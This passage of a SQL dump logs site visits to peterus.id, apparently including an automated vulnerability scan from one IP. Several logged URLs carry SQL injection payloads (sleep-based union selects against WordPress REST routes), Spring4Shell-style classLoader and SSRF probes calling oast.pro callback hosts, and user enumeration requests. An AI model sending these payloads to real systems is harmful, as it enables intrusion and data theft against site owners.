(139, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?destination=&p=member', '2025-06-27 06:54:51', '2025-06-27 06:54:51'),
(140, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/119.0 Safari/537.36', 'https://www.peterus.id/?item_id=0%20union%20select%20sleep%287%29%20--%20g&rest_route=%2Fwc%2Fv3%2Fwishlist%2Fremove_product%2F1', '2025-06-27 06:54:55', '2025-06-27 06:54:55'),
(141, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://www.peterus.id/?post_ids=0%29%20union%20select%20md5%28999999999%29%2Cnull%2Cnull%20--%20g&rest_route=%2Fpvc%2Fv1%2Fincrease%2F1', '2025-06-27 06:55:21', '2025-06-27 06:55:21'),
(142, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://www.peterus.id', '2025-06-27 06:55:39', '2025-06-27 06:55:39'),
(143, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17', 'https://www.peterus.id', '2025-06-27 06:55:51', '2025-06-27 06:55:51'),
(144, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://peterus.id', '2025-06-27 06:56:21', '2025-06-27 06:56:21'),
(145, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15', 'https://peterus.id', '2025-06-27 06:56:24', '2025-06-27 06:56:24'),
(146, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15', 'https://peterus.id', '2025-06-27 06:57:34', '2025-06-27 06:57:34'),
(147, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-06-27 06:57:48', '2025-06-27 06:57:48'),
(148, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 06:59:40', '2025-06-27 06:59:40'),
(149, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://www.peterus.id', '2025-06-27 06:59:41', '2025-06-27 06:59:41'),
(150, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://www.peterus.id', '2025-06-27 07:00:53', '2025-06-27 07:00:53'),
(151, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.7 Mobile/15E148 Safari/604.1', 'https://peterus.id/index.php?rest_route=%2Fxs-donate-form%2Fpayment-redirect%2F3', '2025-06-27 07:02:17', '2025-06-27 07:02:17'),
(152, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id', '2025-06-27 07:03:39', '2025-06-27 07:03:39'),
(153, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?rest_route=%2Fxs-donate-form%2Fpayment-redirect%2F3', '2025-06-27 07:04:15', '2025-06-27 07:04:15'),
(154, '111.229.69.139', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://peterus.id', '2025-06-27 07:12:13', '2025-06-27 07:12:13'),
(155, '111.229.69.139', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://www.peterus.id', '2025-06-27 07:12:14', '2025-06-27 07:12:14'),
(156, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id/?class.module.classLoader.resources.context.configFile=http%3A%2F%2Fd1f0llipp1o26gc6gergacj7xocomb1me.oast.pro&class.module.classLoader.resources.context.configFile.content.aaa=xxx', '2025-06-27 07:16:57', '2025-06-27 07:16:57'),
(157, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id/?class.module.classLoader.resources.context.configFile=https%3A%2F%2Fd1f0llipp1o26gc6gergmrmhfjay4m4r1.oast.pro&class.module.classLoader.resources.context.configFile.content.aaa=xxx', '2025-06-27 07:16:57', '2025-06-27 07:16:57'),
(158, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0', 'https://peterus.id/?location=search', '2025-06-27 07:16:58', '2025-06-27 07:16:58'),
(159, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15', 'https://www.peterus.id/?location=search', '2025-06-27 07:19:10', '2025-06-27 07:19:10'),
(160, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id/?class.module.classLoader.resources.context.configFile=https%3A%2F%2Fd1f0llipp1o26gc6gergrzp9he1rfm4ct.oast.pro&class.module.classLoader.resources.context.configFile.content.aaa=xxx', '2025-06-27 07:19:22', '2025-06-27 07:19:22'),
(161, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36', 'https://www.peterus.id/?class.module.classLoader.resources.context.configFile=http%3A%2F%2Fd1f0llipp1o26gc6gerg6ryn7bxmuh6xx.oast.pro&class.module.classLoader.resources.context.configFile.content.aaa=xxx', '2025-06-27 07:19:22', '2025-06-27 07:19:22'),
(162, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 07:20:21', '2025-06-27 07:20:21'),
(163, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 07:22:11', '2025-06-27 07:22:11'),
(164, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'https://peterus.id', '2025-06-27 07:28:28', '2025-06-27 07:28:28'),
(165, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:109.0) Gecko/20100101 Firefox/115.0', 'https://peterus.id', '2025-06-27 07:28:29', '2025-06-27 07:28:29'),
(166, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://www.peterus.id', '2025-06-27 07:31:57', '2025-06-27 07:31:57'),
(167, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 07:31:58', '2025-06-27 07:31:58'),
(168, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://peterus.id', '2025-06-27 07:32:04', '2025-06-27 07:32:04'),
(169, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.9 Mobile/15E148 Safari/604.1', 'https://www.peterus.id', '2025-06-27 07:34:02', '2025-06-27 07:34:02'),
(170, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15', 'https://peterus.id/?pid=0&uid=0&url=test&visitorId=1331%27%20and%20sleep%287%29%20or%20%27&wmcAction=wmcTrack', '2025-06-27 07:43:41', '2025-06-27 07:43:41'),
(171, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'https://www.peterus.id/?pid=0&uid=0&url=test&visitorId=1331%27%20and%20sleep%287%29%20or%20%27&wmcAction=wmcTrack', '2025-06-27 07:45:36', '2025-06-27 07:45:36'),
(172, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0', 'https://peterus.id', '2025-06-27 07:51:43', '2025-06-27 07:51:43'),
(173, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-06-27 07:51:43', '2025-06-27 07:51:43'),
(174, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 07:54:15', '2025-06-27 07:54:15'),
(175, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 07:54:15', '2025-06-27 07:54:15'),
(176, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 07:57:28', '2025-06-27 07:57:28'),
(177, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.9 Safari/605.1.15', 'https://peterus.id', '2025-06-27 07:59:33', '2025-06-27 07:59:33'),
(178, '156.246.17.42', 'Mozilla/5.0 &#40;Macintosh; Intel Mac OS X 10_15_7&#41; AppleWebKit/605.1.15 &#40;KHTML, like Gecko&#41; Version/18.3.1 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 08:00:55', '2025-06-27 08:00:55'),
(179, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25', 'https://www.peterus.id', '2025-06-27 08:01:34', '2025-06-27 08:01:34'),
(180, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Safari/605.1.15', 'https://peterus.id', '2025-06-27 08:02:32', '2025-06-27 08:02:32'),
(181, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id/?phonepe_action=curltestPhonePe&url=http%3A%2F%2Fd1f0llipp1o26gc6gergreeqategoddex.oast.pro', '2025-06-27 08:03:11', '2025-06-27 08:03:11'),
(182, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 08:04:32', '2025-06-27 08:04:32'),
(183, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://www.peterus.id/?phonepe_action=curltestPhonePe&url=http%3A%2F%2Fd1f0llipp1o26gc6gergirxgxuziygmbu.oast.pro', '2025-06-27 08:05:12', '2025-06-27 08:05:12'),
(184, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id', '2025-06-27 08:05:56', '2025-06-27 08:05:56'),
(185, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686; rv:129.0) Gecko/20100101 Firefox/129.0', 'https://peterus.id', '2025-06-27 08:07:17', '2025-06-27 08:07:17'),
(186, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://peterus.id', '2025-06-27 08:07:30', '2025-06-27 08:07:30'),
(187, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://peterus.id', '2025-06-27 08:09:20', '2025-06-27 08:09:20'),
(188, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0', 'https://www.peterus.id', '2025-06-27 08:09:21', '2025-06-27 08:09:21'),
(189, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 08:09:21', '2025-06-27 08:09:21'),
(190, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 08:09:33', '2025-06-27 08:09:33'),
(191, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 08:09:59', '2025-06-27 08:09:59'),
(192, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://www.peterus.id', '2025-06-27 08:12:47', '2025-06-27 08:12:47'),
(193, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://www.peterus.id', '2025-06-27 08:12:47', '2025-06-27 08:12:47'),
(194, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id', '2025-06-27 08:13:32', '2025-06-27 08:13:32'),
(195, '156.246.17.42', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0', 'https://www.peterus.id', '2025-06-27 08:15:36', '2025-06-27 08:15:36'),
(196, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/106.0 Safari/537.36', 'https://peterus.id', '2025-06-27 08:21:11', '2025-06-27 08:21:11'),
(197, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://peterus.id', '2025-06-27 08:22:20', '2025-06-27 08:22:20'),
(198, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0', 'https://peterus.id/index.php', '2025-06-27 08:22:51', '2025-06-27 08:22:51'),
(199, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://www.peterus.id', '2025-06-27 08:24:17', '2025-06-27 08:24:17'),
(200, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 08:24:36', '2025-06-27 08:24:36'),
(201, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://www.peterus.id/index.php', '2025-06-27 08:24:48', '2025-06-27 08:24:48'),
(202, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://peterus.id/?code=a%27%20OR%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%287%29%29%29a%29--%20-&rest_route=%2Fpmpro%2Fv1%2Forder', '2025-06-27 08:25:55', '2025-06-27 08:25:55'),
(203, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 08:28:47', '2025-06-27 08:28:47'),
(204, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 08:32:23', '2025-06-27 08:32:23'),
(205, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://www.peterus.id/?code=a%27%20OR%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%287%29%29%29a%29--%20-&rest_route=%2Fpmpro%2Fv1%2Forder', '2025-06-27 08:32:59', '2025-06-27 08:32:59'),
(206, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://peterus.id', '2025-06-27 08:33:41', '2025-06-27 08:33:41'),
(207, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15', 'https://peterus.id', '2025-06-27 08:34:26', '2025-06-27 08:34:26'),
(208, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15', 'https://peterus.id', '2025-06-27 08:34:31', '2025-06-27 08:34:31'),
(209, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 08:37:02', '2025-06-27 08:37:02'),
(210, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 08:37:51', '2025-06-27 08:37:51'),
(211, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/123.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 08:40:43', '2025-06-27 08:40:43'),
(212, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0', 'https://peterus.id', '2025-06-27 08:48:22', '2025-06-27 08:48:22'),
(213, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0', 'https://www.peterus.id', '2025-06-27 08:50:53', '2025-06-27 08:50:53'),
(214, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8.1 Safari/605.1.15', 'https://peterus.id', '2025-06-27 08:52:34', '2025-06-27 08:52:34'),
(215, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 08:54:25', '2025-06-27 08:54:25'),
(216, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0 PromptMapper/9.0.3.2', 'https://www.peterus.id', '2025-06-27 08:56:27', '2025-06-27 08:56:27'),
(217, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 08:56:41', '2025-06-27 08:56:41'),
(218, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:01:34', '2025-06-27 09:01:34'),
(219, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15', 'https://peterus.id', '2025-06-27 09:02:37', '2025-06-27 09:02:37'),
(220, '156.246.17.42', 'Mozilla/5.0 (Windows NT 6.2; rv:137.0) Gecko/20100101 Firefox/137.0', 'https://www.peterus.id', '2025-06-27 09:03:37', '2025-06-27 09:03:37'),
(221, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 09:04:45', '2025-06-27 09:04:45'),
(222, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Avira/134.0.0.0', 'https://peterus.id/index.php?a=register&c=user&m=default&u=0', '2025-06-27 09:11:51', '2025-06-27 09:11:51'),
(223, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:12:29', '2025-06-27 09:12:29'),
(224, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:13:03', '2025-06-27 09:13:03'),
(225, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://www.peterus.id/index.php?a=register&c=user&m=default&u=0', '2025-06-27 09:13:52', '2025-06-27 09:13:52'),
(226, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'https://peterus.id/?rest_route=%2Fwp%2Fv2%2Fusers', '2025-06-27 09:14:24', '2025-06-27 09:14:24'),
(227, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://www.peterus.id', '2025-06-27 09:14:29', '2025-06-27 09:14:29'),
(228, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 09:16:21', '2025-06-27 09:16:21'),
(229, '156.246.17.42', 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:16:21', '2025-06-27 09:16:21'),
(230, '156.246.17.42', 'python-requests/2.26.0', 'https://peterus.id', '2025-06-27 09:18:00', '2025-06-27 09:18:00'),
(231, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id', '2025-06-27 09:19:17', '2025-06-27 09:19:17'),
(232, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:19:59', '2025-06-27 09:19:59'),
(233, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://www.peterus.id', '2025-06-27 09:19:59', '2025-06-27 09:19:59'),
(234, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/109.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:20:24', '2025-06-27 09:20:24'),
(235, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 09:22:20', '2025-06-27 09:22:20'),
(236, '156.246.17.42', 'Mozilla/5.0 (Windows NT 6.2; rv:128.9) Gecko/20100101 Firefox/128.9', 'https://www.peterus.id', '2025-06-27 09:22:53', '2025-06-27 09:22:53'),
(237, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/108.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 09:23:14', '2025-06-27 09:23:14'),
(238, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id', '2025-06-27 09:24:32', '2025-06-27 09:24:32'),
(239, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://www.peterus.id/?rest_route=%2Fwp%2Fv2%2Fusers', '2025-06-27 09:24:57', '2025-06-27 09:24:57'),
(240, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:26:16', '2025-06-27 09:26:16'),
(241, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://www.peterus.id', '2025-06-27 09:26:38', '2025-06-27 09:26:38'),
(242, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15', 'https://peterus.id', '2025-06-27 09:27:32', '2025-06-27 09:27:32'),
(243, '156.246.17.42', 'python-requests/2.26.0', 'https://www.peterus.id', '2025-06-27 09:27:55', '2025-06-27 09:27:55');
INSERT INTO `visits` (`id`, `ip_address`, `user_agent`, `url`, `created_at`, `updated_at`) VALUES
(244, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.15', 'https://peterus.id', '2025-06-27 09:30:59', '2025-06-27 09:30:59'),
(245, '172.232.232.10', 'Mozilla/5.0 (Linux; Android 12; SM-G990B; Build/SQ1D.190012.80) AppleWebKit/537.36 (KHTML', 'https://peterus.id', '2025-06-27 09:33:13', '2025-06-27 09:33:13'),
(246, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 09:33:18', '2025-06-27 09:33:18'),
(247, '172.232.232.10', NULL, 'https://peterus.id', '2025-06-27 09:33:33', '2025-06-27 09:33:33'),
(248, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://www.peterus.id', '2025-06-27 09:35:17', '2025-06-27 09:35:17'),
(249, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 09:35:33', '2025-06-27 09:35:33'),
(250, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0 PromptMapper/9.0.3.2', 'https://peterus.id', '2025-06-27 09:39:08', '2025-06-27 09:39:08'),
(251, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id', '2025-06-27 09:40:07', '2025-06-27 09:40:07'),
(252, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 09:41:22', '2025-06-27 09:41:22'),
(253, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 09:43:28', '2025-06-27 09:43:28'),
